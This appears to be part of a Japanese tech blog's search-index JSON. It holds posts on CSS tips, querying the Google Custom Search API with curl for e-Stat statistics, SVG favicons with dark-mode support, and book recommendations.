Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-19T18:31:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（２）"},{"content":"出典元：8 Essential CSS Tips and Tricks Every Developer Should Know\nCSSは、HTMLスケルトンを設定した後、Webページにスタイルを追加するために使用されます。さらに、わずか数行のコードでCSSで洗練されたデザインを作成できます。\nすべての開発者は、プロジェクトを迅速かつ効率的に開発するために、これらのCSSのトリックを知っている必要があります。あなたの生産性を次のレベルに確実に向上させます。\nそれでは始めてみましょう。\nhover効果 ：hoverセレクターを使用して、HTML要素にホバー効果を追加できます。\n次の例ではボタン要素にホバー効果を追加します。\n\u0026lt;button\u0026gt;Hover Over Me\u0026lt;/button\u0026gt; button:hover { color: #0062FF; border: #0062FF solid 1px; background: #FFFF99; } このコードをいじって、フェードイン、拡縮、変形などのエフェクトを追加できます。\nCSSホバーへのフェードイン効果 button{ opacity: 0.5 } button:hover{ opacity: 1; } CSSホバーへの拡縮効果 button:hover{ -webkit-transform: scale(1.2); -ms-transform: scale(1.2); transform: scale(1.2); } divコンテナに合うように画像のサイズを変更します height、width、およびobject-fitプロパティを使用して、divコンテナに合うように画像のサイズを変更できます。\n\u0026lt;img class=\u0026#34;random-image\u0026#34; src=\u0026#34;画像ファイル\u0026#34; /\u0026gt; .random-image { eight: 100%; width: 100%; object-fit: contain; } すべてのスタイルをオーバーライドする !important を使用して、属性の他のすべてのスタイル宣言（インラインスタイルを含む）をオーバーライドできます。\n\u0026lt;p class=\u0026#34;className\u0026#34; id=\u0026#34;idName\u0026#34; style=\u0026#34;background-color: orange;\u0026#34;\u0026gt; Hello World! \u0026lt;/p\u0026gt; p { background-color: yellow; } .className { background-color: blue !important; } #idName { background-color: green; } この例では、!importantルールが他のすべての背景色宣言をオーバーライドし、背景色が緑ではなく青に設定されるようにします。\nただし、!important は便利ではありますが、使いすぎると上書きできないといった不具合にもつながるので、できるだけ階層を持ったCSSの記述を心がけてください。\n三点リーダー text-overflow のCSSプロパティを使用して、オーバーフローしたテキストを省略記号（\u0026hellip;）で切り捨てることができます。\n\u0026lt;p class=\u0026#34;text\u0026#34;\u0026gt; Lorem ipsum dolor sit amet consectetur adipisicing elit, sed do eiusmod tempor. \u0026lt;/p\u0026gt; .text { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 200px; } 文字の変形 text-transform CSSプロパティを使用して、テキストを強制的に大文字、小文字、または大文字にすることができます。\n指定文字を大文字にする（Uppercase） text-transform: uppercase;のCSSを使用すると、クラスなどで指定した範囲をすべて大文字表示にできます。\n\u0026lt;p class=\u0026#34;uppercase\u0026#34;\u0026gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. \u0026lt;/p\u0026gt; .uppercase { text-transform: uppercase; } 指定文字を小文字にする（Lowercase） text-transform: lowercase;のCSSを使用することで、クラスなどで指定した範囲をすべて小文字表示にできます。\n\u0026lt;p class=\u0026#34;lowercase\u0026#34;\u0026gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. \u0026lt;/p\u0026gt; .lowercase { text-transform: lowercase; } 先頭を大文字に（Capitalize） 先頭文字のみを大文字（Capitalize）したい場合は text-transform: capitalize; のCSSを使用します。\n\u0026lt;p class=\u0026#34;capitalize\u0026#34;\u0026gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. \u0026lt;/p\u0026gt; .capitalize { text-transform: capitalize; } 単一行プロパティ宣言の使用 CSSの省略形のプロパティを使用して、コードを簡潔で読みやすくすることができます。\nたとえば、CSS backgroundは、background-color、background-image、background-repeat、およびbackground-positionの値を定義できる省略形のプロパティです。\n同様に、フォント、境界線、マージン、およびパディングのプロパティを定義できます。\n単一行のbackgroundプロパティ宣言 background-color: black; background-image: url(images/xyz.png); background-repeat: no-repeat; background-position: left top; 上記の宣言を1行に簡略化できます。\nbackground: black url(images/xyz.png) no-repeat left top; 省略形のプロパティは非常に使いやすいですが、ブラウザ依存などもあるので、使用する際には、 tricky edgecases （MDN Web Docsで概説されている）を考慮する必要があります。\nツールチップ ツールチップは、ユーザーがマウスポインターを要素上に移動したときに、要素に関する詳細情報を表示する方法です。\n右方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Right Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; top: -5px; left: 105%; } .tooltip_div:hover .tooltip { visibility: visible; } 左方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Left Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; top: -5px; right: 105%; } .tooltip_div:hover .tooltip { visibility: visible; } 上方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Top Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; bottom: 100%; left: 50%; margin-left: -60px; } .tooltip_div:hover .tooltip { visibility: visible; } 下方向のツールチップ \u0026lt;div class=\u0026#34;tooltip_div\u0026#34;\u0026gt; Bottom Tooltip \u0026lt;span class=\u0026#34;tooltip\u0026#34;\u0026gt;This is the Tooltip text\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; body { text-align: center; } .tooltip_div { position: relative; display: inline-block; } .tooltip_div .tooltip { visibility: hidden; width: 170px; background-color: blue; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; /* Positioning the tooltip */ position: absolute; z-index: 1; top: 100%; left: 50%; margin-left: -60px; } .tooltip_div:hover .tooltip { visibility: visible; } Bootstrapライブラリを使用して、カスタムの Bootstrap tooltips を作成することもできます。\n影を追加 text-shadowおよびbox-shadowCSSプロパティをそれぞれ使用して、テキストおよび要素にCSSシャドウ効果を追加できます。\n文字に影を追加 text-shadow CSSプロパティは、テキストに影とレイヤーを追加します。 text-shadowプロパティは、テキストに適用されるシャドウのコンマ区切りリストを受け入れます。\n/* text-shadowには4つのCSSプロパティがあります:offset-x, offset-y, blur-radius, and color */ /* offset-x | offset-y | blur-radius | color */ text-shadow: 2px 2px 4px red; /* color | offset-x | offset-y | blur-radius */ text-shadow: #18fa3e 1px 2px 10px; color および blur-radius 引数はオプションです。\nこんなこともできます。\nbackground: #e74c3c; color: #fff; font-family: lato; text-shadow: 1px 1px rgba(123, 25, 15, 0.5), 2px 2px rgba(129, 28, 18, 0.51), 3px 3px rgba(135, 31, 20, 0.52), 4px 4px rgba(140, 33, 22, 0.53), 5px 5px rgba(145, 36, 24, 0.54), 6px 6px rgba(150, 38, 26, 0.55), 7px 7px rgba(154, 40, 28, 0.56), 8px 8px rgba(158, 42, 30, 0.57), 9px 9px rgba(162, 44, 31, 0.58), 10px 10px rgba(166, 45, 33, 0.59), 11px 11px rgba(169, 47, 34, 0.6), 12px 12px rgba(173, 48, 36, 0.61), 13px 13px rgba(176, 50, 37, 0.62), 14px 14px rgba(178, 51, 38, 0.63), 15px 15px rgba(181, 52, 39, 0.64), 16px 16px rgba(184, 54, 40, 0.65), 17px 17px rgba(186, 55, 41, 0.66), 18px 18px rgba(189, 56, 42, 0.67), 19px 19px rgba(191, 57, 43, 0.68), 20px 20px rgba(193, 58, 44, 0.69), 21px 21px rgba(195, 59, 45, 0.7), 22px 22px rgba(197, 60, 46, 0.71), 23px 23px rgba(199, 61, 47, 0.72), 24px 24px rgba(201, 62, 47, 0.73), 25px 25px rgba(202, 62, 48, 0.74), 26px 26px rgba(204, 63, 49, 0.75), 27px 27px rgba(206, 64, 49, 0.76), 28px 28px rgba(207, 65, 50, 0.77), 29px 29px rgba(209, 65, 51, 0.78), 30px 30px rgba(210, 66, 51, 0.79), 31px 31px rgba(211, 67, 52, 0.8), 32px 32px rgba(213, 67, 52, 0.81), 33px 33px rgba(214, 68, 53, 0.82), 34px 34px rgba(215, 69, 53, 0.83), 35px 35px rgba(216, 69, 54, 0.84), 36px 36px rgba(218, 70, 54, 0.85), 37px 37px rgba(219, 70, 55, 0.86), 38px 38px rgba(220, 71, 55, 0.87), 39px 39px rgba(221, 71, 56, 0.88), 40px 40px rgba(222, 72, 56, 0.89), 41px 41px rgba(223, 72, 57, 0.9), 42px 42px rgba(224, 73, 57, 0.91), 43px 43px rgba(225, 73, 57, 0.92), 44px 44px rgba(225, 73, 58, 0.93), 45px 45px rgba(226, 74, 58, 0.94), 46px 46px rgba(227, 74, 58, 0.95), 47px 47px rgba(228, 75, 59, 0.96), 48px 48px rgba(229, 75, 59, 0.97), 49px 49px rgba(230, 75, 59, 0.98), 50px 50px rgba(230, 76, 60, 0.99); 要素に影をつける box-shadowプロパティは、HTML要素に影を適用するために使用されます。\nbox-shadowの構文は下記になります。\nbox-shadow: [横方向のオフセット] [縦方向のオフセット] [ぼかしの量] [影の広がり（オプション）] [色]; ぼかし、広がり、色のパラメーターはオプションです。\n実際の記述は次のようになります。\nbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; この記事で使用されている完全なソースコードを確認したい場合は、GitHubリポジトリをご覧ください。\nWebサイトにCSSのテキストシャドウを追加することは、ユーザーの注意を引くのに最適な方法です。Webサイトにある種のエレガンスとユニークな雰囲気を与えることができます。あなたのサイトのテーマに合うようなテキストシャドウの例を、創造力を働かせて試してみてください。\nまとめ いかがだったでしょうか。いままでJSを使ってやっていたことが実はCSSでも可能になっているケースが多いです。\njavascript記述するよりも、cssのほうが軽量です。\nぜひ皆さんのサイトにも導入してUI、UXの向上につなげてみてください。\nオススメの書籍 HTML5 \u0026amp; CSS3 デザインレシピ集 本書は、HTML5とCSS3によるWebサイト制作のための\u0026#34;おいしい\u0026#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5\u0026#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-19T08:08:44+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-19-01-wyoshi/catch_huc19f2e42c6c13af74652a676a595a4af_55602_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-19-01-wyoshi/","title":"CSSでもできる！知っておくべき重要なヒントとコツ 8選 8選"},{"content":"統計名でgoogle検索して関心度の高いキーワードを抽出しよう e-Statの解析の目標として、膨大な統計データの中から一般の人に関心度の高いものを抽出してデータを要約したいと考えています。\ngoogle検索で上位にくるものは関心度が高いと言えるでしょうから統計名でgoogle検索して関心度の高いキーワードを抽出したいと思います。\ngoogle検索を自動でするためにGoogle Custom Search APIを使います。\nGoogle Custom Search API は１日１００回までは無料で、それ以上だと１０００回につき５ドル課金されるみたいです。\nhttps://developers.google.com/custom-search/v1/overview#pricing\n１日に発表される統計は10個いかないくらいなので無料の範囲で使えそうです。\nGoogle Custom Search APIを使ってみましょう。\nGoogle Custom Search API を使えるように設定する（2022年1月時点) 以下の手順で設定します。\n・googleアカウントを取得する\ngmailのメールアドレスです。\n・Google Cloud Platformでクレジットカード情報を登録する\nhttps://console.cloud.google.com/billing/create?hl=ja\n・プロジェクトを作成する\nhttps://console.cloud.google.com/projectcreate\n・認証情報を作成する\nhttps://console.cloud.google.com/apis/credentials\n「+認証情報を作成」をクリックして「APIキー」を選択すると\nAPIキーが作成されますのでコピーしておきましょう\n・APIキーの利用制限\nキーの制限をクリックしてAPIキーの利用を制限しておきましょう\n接続元が固定のIPアドレスを持っているなら「アプリケーションの制限」でIPアドレスを設定しましょう。\nAPIの制限もとりあえすCustom Search API １個にしときます。\n保存ボタンをクリックします\n・Custom Search API を有効にする\nhttps://console.cloud.google.com/apis/library/customsearch.googleapis.com 「有効にする」ボタンをクリックします。\n・検索エンジンIDの取得\nhttps://cse.google.com/create/new\n検索するサイトは「www.google.co.jp（後で削除するので適当で良いです）」\n言語は「日本語」\n検索エンジンの名前は適当で良いです。\n左側の設定ボタンを押すと画面中央中段に「検索エンジンID」があるのでコピーします。\n検索するサイトをで「www.google.co.jp」を「削除」します\n「ウェブ全体を検索」を「オン」にします\nCurlでGoogle Custom Search API検索する 試しに検索してみましょう。\ncurlを利用します。\ncurlでAPIキー、検索エンジンID、キーワードを指定して検索します。\n$ curl \u0026#39;https://www.googleapis.com/customsearch/v1?key=google apiキー\u0026amp;cx=検索エンジン ID\u0026amp;q=検索キーワード\u0026#39; 「木材流通統計調査」で検索してみました。\n$ curl \u0026#39;https://www.googleapis.com/customsearch/v1?key=google apiキー\u0026amp;cx=検索エンジンID\u0026amp;q=木材流通統計調査\u0026#39; 結果はjsonで返ってきます。\n見た感じ、ブラウザのgoogle検索の結果と同じ感じなので良さそうですね。\n\u0026#34;items\u0026#34;: [ { \u0026#34;kind\u0026#34;: \u0026#34;customsearch#result\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;木材流通統計調査：農林水産省\u0026#34;, \u0026#34;htmlTitle\u0026#34;: \u0026#34;\\u003cb\\u003e木材流通統計調査\\u003c/b\\u003e：農林水産省\u0026#34;, \u0026#34;link\u0026#34;: \u0026#34;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/\u0026#34;, \u0026#34;displayLink\u0026#34;: \u0026#34;www.maff.go.jp\u0026#34;, \u0026#34;snippet\u0026#34;: \u0026#34;木材流通構造調査, 木材の販売金額、素材及び材料の入荷先別入荷量、製材品、合板及び集成材の出荷先別出荷量、製材用、合単板及び木材チップ製造用機械の所有状況、 ...\u0026#34;, \u0026#34;htmlSnippet\u0026#34;: \u0026#34;\\u003cb\\u003e木材流通\\u003c/b\\u003e構造\\u003cb\\u003e調査\\u003c/b\\u003e, \\u003cb\\u003e木材\\u003c/b\\u003eの販売金額、素材及び材料の入荷先別入荷量、製材品、合板及び集成材の出荷先別出荷量、製材用、合単板及び\\u003cb\\u003e木材\\u003c/b\\u003eチップ製造用機械の所有状況、\u0026amp;nbsp;...\u0026#34;, \u0026#34;cacheId\u0026#34;: \u0026#34;cMExMff56bgJ\u0026#34;, \u0026#34;formattedUrl\u0026#34;: \u0026#34;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/\u0026#34;, \u0026#34;htmlFormattedUrl\u0026#34;: \u0026#34;https://www.maff.go.jp/j/tokei/kouhyou/mokuryu/\u0026#34;, \u0026#34;pagemap\u0026#34;: { \u0026#34;cse_thumbnail\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcSmlCF9ltcQbjL9DAnpZfJIotIT2ej4cd_YfBfs5ew-v2FR_NxjLAGdFTTI\u0026#34;, \u0026#34;width\u0026#34;: \u0026#34;200\u0026#34;, \u0026#34;height\u0026#34;: \u0026#34;200\u0026#34; } ], \u0026#34;metatags\u0026#34;: [ { \u0026#34;viewport\u0026#34;: \u0026#34;width=device-width, initial-scale=1\u0026#34;, \u0026#34;format-detection\u0026#34;: \u0026#34;telephone=no\u0026#34; } ], \u0026#34;cse_image\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://www.maff.go.jp/j/shared_new/shared/images/icon_pnavi@2x.png\u0026#34; } ] } }, 検索結果 書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-19T00:31:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-19-01-ani/","title":"e-Stat でGoogle Custom Search APIを使おう（１）"},{"content":"最近ダークモードと呼ばれる機能に対応したアプリが増え、それと同じようにWebサイトでもダークモードに対応しているものを見かけるようになりました。\n今回はWebサイトの中でファビコンを1サイズで用意して、さらにそのファビコンをダークモードに対応させてみたいと思います。\nダークモードって何？ ダークモードとは画面の色を反転して表示するスマホやタブレットに追加された機能となります。\niPhoneやiPadなどが先行iOS13のリリースの際に実装しました。\nたとえば、一般的なアプリの背景は白だったかと思いますが、ダークモードをオンにしているときは背景の色が暗めの配色となり、文字色が反対に明るめの配色になったりします。\nこの機能は光が抑えられるため、目に優しかったりすると言われてます。さらに、画面の発光を抑えられるため、バッテリーの持ちも良くなるとのことでした。\nこのダークモード機能がMacやWindowsなどのパソコンでも使用可能となり、それに伴ってブラウザでも使えるようになりました。\nWEBサイトをダークモードに対応 Webサイトを構築する際に、今までのCSSは下記のような記述になっていたかと思います。\nbody { background-color: #FFF; color: #000; } 背景を白にして、文字色を黒にするといったような記述です。\nこの場合、ダークモードに対応した端末で見た場合に、ダークモードがONであるにもかかわらず、背景が白のサイトが表示されてしまいます。\nこれをダークモードに対応させると、\n@media (prefers-color-scheme: dark) { body { background-color: #000; color: #fff; } } 上記のCSSのように @media (prefers-color-scheme: dark) を追記して、ダークモードの場合は別のCSSで上書きをしてやる必要があります。\n実はこの機能を使うことで、ファビコンも色を変えて、ダークモードに対応させることができてしまうのです。\nファビコンは1つ 今まで、ファビコンは大量に設置する必要がありました。\n全部設置仕様となると、50個近くのファイルを読み込んで、metaに記述する必要がありました。\nそんな手間をしたくないと思います。\nそもそも、そんなに大量のファビコンは必要でしょうか？\nモダンブラウザと呼ばれる最新のブラウザのみに対応であればファビコンは1つで十分です。\n「サイズごとに用意する必要があるのに、そんなことないだろ」と思われるかもしれませんが、近年のブラウザはSVGと呼ばれる形式の画像に対応しております。\nこの画像は従来のピクセルデータではなく、ベクターデータと呼ばれる座標で画像を構築してます。\n座標データなので、縮小、拡大しても画質は綺麗なままです。\nそれではSVGでファビコンを作ったらどうでしょうか？\nそうです。大量のサイズを用意しないで、1ファイルでファビコンを用意できてしまうのです。\nファビコンを設置 ファビコンをIllustratorやXDで作成して、SVG形式で保存します。\n作成したファビコンをWebサイトに反映します。\n\u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;favicon.svg\u0026#34; type=\u0026#34;image/svg+xml\u0026#34;\u0026gt; head部分に上記のlinkタグを記述します。hrefの部分は適宜変更してください。\nこれでファビコンをSVG化することができました。\nファビコンをダークモードに対応させる ダークモードに対応させるためにはもうひと工夫必要です。さきほど作成したファイルを開いて、CSSのスタイルを追加します。\nIllustratorで色を塗っていた場合、styleタグに色情報が記述されているかと思います。\nそこに、@media (prefers-color-scheme: dark) でダークモードの際の色を指定します。\nfillはSVGの塗りつぶしを意味してます。\n\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .st0 { fill: #34495E; } @media (prefers-color-scheme: dark) { .st0{ fill:# FFF; } } \u0026lt;/style\u0026gt; これでfaviconもダークモード対応できました。\n実際にブウラウザでアクセスして、ダークモードを切り替えると確認できるかと思います。\nまとめ 今まで大量のfaviconを用意して、metaタグに記述していましたが、モダンブラウザになると、SVGファイル1つでさまざまなサイズに対応可能です。しかも画質がきれいなので、高画素端末で見ても安心です。\nさらに、SVGファイルのファビコンであればファイル自体にcssのスタイルを記述できるので、@media (prefers-color-scheme: dark) を使ってダークモードに対応することもできます。\nこうした小さなUI、UXの改善がウェブサイトの大きな改善につながるのではないかと思います。\nみなさんも、ぜひダークモードに対応したおしゃれなファビコンを設置してみませんか？\nオススメの書籍 ブランディングデザインの教科書 企業経営に役立つ「ブランディング」と「デザイン」がこの1冊で一気にわかる! ブランディング成功の秘訣とは──。 これからブランディングをはじめたい経営者やプランナー、ブランド全体をデザインしてみたいというデザイナーや学生の方に向け、100以上のブランド開発実績を持つブランディングデザイナー西澤明洋が「ブランディング」と「デザイン」の方法を徹底解説。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ICONISM 世界のアイコン・ピクトグラムのデザイン 情報をわかりやすく効果的に伝えるデザインと活用例が満載! アイコンやピクトグラムは、ガイドサインだけでなく、ブランディングやウェブサイト・アプリなど現代生活のあらゆる場面で、コミュニケーションを円滑にするためますます重要な役割を担っています。世界各国の優れたデザインと展開実例を用途別に集めた1冊です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-18T17:17:37+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-18-01-wyoshi/catch_hu7b0d7bf6b0518dcefbd34462cf17def3_20503_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-18-01-wyoshi/","title":"ファビコンは1サイズのみ！さらにダークモード対応させる"},{"content":"出典元：Top 15 Mobile App Development Trends to Watch for in 2022\nモバイルアプリ開発業界は、驚異的なスピードで進化しています。このデジタルダーウィン時代に生き残り、繁栄するには、変化するモバイルアプリ開発のトレンドに精通する必要があります。 今日、スマートフォンはデジタルメディアの成功の鍵です。これは、ビジネスモデル、運用モデル、および市場を驚くべき速度で根本的に変革します。 